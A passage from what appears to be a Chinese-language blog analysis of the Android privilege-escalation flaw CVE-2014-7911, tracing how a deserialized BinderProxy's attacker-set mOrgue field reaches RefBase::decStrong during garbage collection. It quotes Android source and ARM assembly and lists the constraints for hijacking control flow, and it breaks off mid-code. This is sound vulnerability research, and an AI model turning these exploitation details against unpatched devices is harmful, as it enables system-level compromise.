&lt;p&gt;这里有个关键问题：&lt;br&gt;为什么要触发GC，触发GC后发生了什么导致漏洞的触发？同样我会在下面解释。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;Native层分析&quot;&gt;&lt;a href=&quot;#Native层分析&quot; class=&quot;headerlink&quot; title=&quot;Native层分析&quot;&gt;&lt;/a&gt;Native层分析&lt;/h3&gt;&lt;p&gt;假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。&lt;br&gt;android.os.BinderProxy的finalize方法调用native代码，将mOrgue处理为指针：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;finalize&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Throwable &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			destroy();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;super&lt;/span&gt;.finalize();	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不熟悉Java GC机制的不会明白此处finalize方法和我们的漏洞利用有什么关系，这里我将简单介绍一下Java对象的生命周期与垃圾回收（从网上摘抄，出处不详）：&lt;br&gt;创建对象的方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用new语句创建对象。&lt;/li&gt;
&lt;li&gt;使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。&lt;/li&gt;
&lt;li&gt;调用对象的clone()方法&lt;/li&gt;
&lt;li&gt;使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;垃圾回收：&lt;br&gt;对象的可触及性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。&lt;/li&gt;
&lt;li&gt;可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。&lt;/li&gt;
&lt;li&gt;不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为什么要触发GC，触发GC后发生了什么导致漏洞的触发？&lt;br&gt;答：当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，注意该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其中，destroy为native方法：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;native&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;cpp代码：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;android_os_BinderProxy_destroy&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(JNIEnv* env, jobject obj)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	IBinder* b = (IBinder*)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	DeathRecipientList* drl = (DeathRecipientList*)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	LOGDEATH(&lt;span class=&quot;string&quot;&gt;&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;&lt;/span&gt;, obj, b, drl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	drl-&amp;gt;decStrong((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;*)javaObjectForIBinder);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	b-&amp;gt;decStrong((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;*)javaObjectForIBinder);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	IPCThreadState::self()-&amp;gt;flushCommands();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最终native代码调用上述decStrong方法，从&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;DeathRecipientList* drl = (DeathRecipientList*)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这一行可以看出，drl就是mOrgue，可以被攻击者控制。 所以，drl-&amp;gt;decStrong方法调用使用的this指针可由攻击者控制。&lt;br&gt;gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue&lt;br&gt;在android_util_Binder.cpp中的int_register_android_os_BinderProxy方法完成初始化：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gBinderProxyOffsets.mObject  = env-&amp;gt;GetFieldID(clazz, &lt;span class=&quot;string&quot;&gt;&quot;mObject&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gBinderProxyOffsets.mOrgue = env-&amp;gt;GetFieldID(clazz, &lt;span class=&quot;string&quot;&gt;&quot;mOrgue&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;即是AAdroid.os.BinderProxy中的变量mObject和mOrgue。&lt;br&gt;为什么我们要修改AAdroid.os.BinderProxy以及为什么要修改为Android.os.BinderProxy？&lt;br&gt;答：注意我们仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。然后如果只有如此，我们仍然无法利用，因为finalize方法仍然是不可控的，我们目前唯一能控制的是该恶意对象，回到我们选择的Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针，并调用。而注意的是，我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;再看一下RefBase类中的decStrong方法&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; RefBase::decStrong(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* id) &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	weakref_impl* &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; refs = mRefs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	refs-&amp;gt;removeStrongRef(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; PRINT_REFS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ALOGD(&lt;span class=&quot;string&quot;&gt;&quot;decStrong of %p from %p: cnt=%d\n&quot;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, id, c);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ALOG_ASSERT(c &amp;gt;= &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;decStrong() called on %p too many times&quot;&lt;/span&gt;, refs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (c == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == 	OBJECT_LIFETIME_STRONG) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		refs-&amp;gt;decWeak(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意上述refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id)最终导致代码执行。&lt;br&gt;我们上面提到我们传入的mOrgue的值，即是drl-&amp;gt;decStrong方法所在类DeathRecipientList的this指针。&lt;/p&gt;
&lt;h3 id=&quot;汇编代码分析&quot;&gt;&lt;a href=&quot;#汇编代码分析&quot; class=&quot;headerlink&quot; title=&quot;汇编代码分析&quot;&gt;&lt;/a&gt;汇编代码分析&lt;/h3&gt;&lt;p&gt;注意我这里添加了一张汇编图示，我导入的是没有strip过的libutils.so，这样IDA中解释出的信息更加丰富。&lt;br&gt;下面看一下发生异常时最后调用的RefBase:decStrong的汇编代码。将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)：&lt;br&gt;&lt;img src=&quot;/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;首先对r0的使用，是在decStrong的前下面三行代码之中：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;weakref_impl* &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; refs = mRefs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;refs-&amp;gt;removeStrongRef(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的汇编代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ldr r4, [r0, #4]   # r0为this指针，r4为mRefs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r6, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r0, r4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx &amp;lt;android_atomic_dec ()&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）&lt;br&gt;然后，android_atomic_dec函数被调用，传入参数&amp;amp;refs-&amp;gt;mStrong。&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这被翻译为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov r0, r4  # r4指向mStrong，r0指向mStrong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx &amp;lt;android_atomic_dec ()&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;作为函数参数，上述r0就是&amp;amp;refs-&amp;gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。&lt;br&gt;另外，refs-&amp;gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;removeStrongRef&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* &lt;span class=&quot;comment&quot;&gt;/*id*/&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&amp;#123; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在调用android_atomic_dec后，出现的是以下代码：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (c == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的汇编代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cmp r0, #1          # r0 = refs-&amp;gt;mStrong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bne.n d1ea&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r0, [r4, #8]    # r4 = &amp;amp;refs-&amp;gt;mStrong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r1, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r3, [r0, #0] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r2, [r3, #12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx r2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&amp;gt;mStrong为1。&lt;br&gt;至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;&lt;/li&gt;
&lt;li&gt;refs-&amp;gt;mStrong必须为1;&lt;/li&gt;
&lt;li&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足：&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(*(*(mOrgue+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	refs = *(mOrgue+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	r2 = *(*(*(refs+&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;))+&lt;span 